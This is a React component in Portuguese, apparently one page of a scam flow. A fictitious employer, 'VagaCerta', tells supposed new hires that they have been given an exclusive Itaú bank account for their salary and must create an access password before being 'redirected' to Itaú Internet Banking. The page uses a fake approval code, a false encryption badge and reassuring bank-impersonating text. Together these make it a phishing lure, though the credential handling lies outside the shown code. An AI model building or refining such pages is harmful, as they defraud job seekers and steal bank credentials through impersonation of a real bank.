
import React, { useState } from 'react';
// eslint-disable-next-line no-unused-vars
import { motion } from 'framer-motion';
const ItauElementMin = null;
import '../../styles/refino.css';

const PaymentCreateAccountStep = ({ onCriarSenha }) => {
  const [loading, setLoading] = useState(false);

  const continuar = async () => {
    setLoading(true);
    setTimeout(async () => {
      await onCriarSenha();
      setLoading(false);
    }, 1000);
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#232323] px-2 pt-10">
      <div className="w-full max-w-md mx-auto">
        {/* Código de aprovação */}
        <div className="mb-4 flex justify-start">
          <span className="bg-[#0ecb7b] text-white font-hendrix-medium text-xs px-3 py-1 rounded-full shadow" style={{ letterSpacing: '0.5px' }}>
            Código de aprovação: #WST-782411
          </span>
        </div>
        {/* Título principal */}
        <h1 className="font-hendrix-bold text-2xl text-white mb-3 leading-tight">
          Agora precisamos que você crie a senha da sua conta de recebimento oficial
        </h1>
        <p className="font-hendrix-regular text-base text-gray-300 mb-6">
          Todo colaborador da VagaCerta recebe uma conta exclusiva do banco Itaú para receber seu salário. Crie a sua senha de acesso para oficializar a conta.
        </p>
        
        {/* Bloco de aviso */}
        <div className="bg-[#292929] rounded-2xl px-6 py-5 mb-8 flex flex-col items-start" style={{ minHeight: '90px' }}>
          <div className="w-full flex justify-start mb-1">
            <svg width="38" height="38" fill="none" style={{ display: 'block' }}>
              <text x="0" y="32" fontSize="45" fill="#fff">*</text>
            </svg>
          </div>
          <div className="w-full">
            <span className="text-gray-100 text-base font-hendrix-regular block" style={{ lineHeight: '1.5', fontSize: '15px' }}>
                            A senha é usada apenas para acessar o aplicativo. <br />
              Lembrando que essa é uma conta exclusiva da VagaCerta em parceria com o itaú para você receber o seu salário.<br />
              <span className="font-hendrix-bold text-white text-base" style={{ display: 'block', marginTop: '2px' }}>
                Se você já tiver uma conta nesse banco não terá interferência alguma.
              </span>
            </span>
          </div>
        </div>
        {/* Card do app Itaú */}
        <div className="bg-white rounded-2xl px-2 pt-6 pb-2 mb-4 flex flex-col items-center shadow" style={{ minHeight: '320px' }}>
          <div className="w-full flex flex-col items-center">
            <span className="font-hendrix-regular text-gray-400 text-xs mb-2 mt-1" style={{ letterSpacing: '0.2px' }}>🔒 Criptografia avançada.</span>
            <img
              src={ItauElementMin}
              alt="Elemento Itaú"
              className="h-120 w-auto p-10"
            />
          </div>
          <div className="w-full text-center mt-2 mb-2">
            <span className="font-hendrix-regular text-gray-700 text-base" style={{ fontSize: '15px' }}>
              Você será direcionado(a) para o <b>Internet Banking do Itaú.</b>
            </span>
          </div>
          <motion.button
            type="button"
            onClick={continuar}
            disabled={loading}
            whileTap={{ scale: 0.97 }}
            whileHover={{ scale: loading ? 1 : 1.03 }}
            className={`w-full mt-2 flex items-center justify-center gap-2 px-6 py-3 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none transition-all duration-300 ${loading ? 'cursor-not-allowed opacity-70' : ''}`}
            style={{
              background: loading ? 'linear-gradient(90deg, #fbbf24 0%, #f97316 100%)' : 'linear-gradient(90deg, #f97316 0%, #fbbf24 100%)',
              fontSize: '15px',
              boxShadow: '0 2px 8px 0 rgba(249,115,22,0.10)',
              border: 'none',
              opacity: loading ? 0.7 : 1
            }}
          >
            {loading ? (
              <>
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                  style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                />
                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13px' }}>Carregando...</span>
              </>
            ) : (
              <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15px' }}>Criar senha de acesso</span>
            )}
          </motion.button>
        </div>
      </div>
    </div>
  );
};

export default PaymentCreateAccountStep;
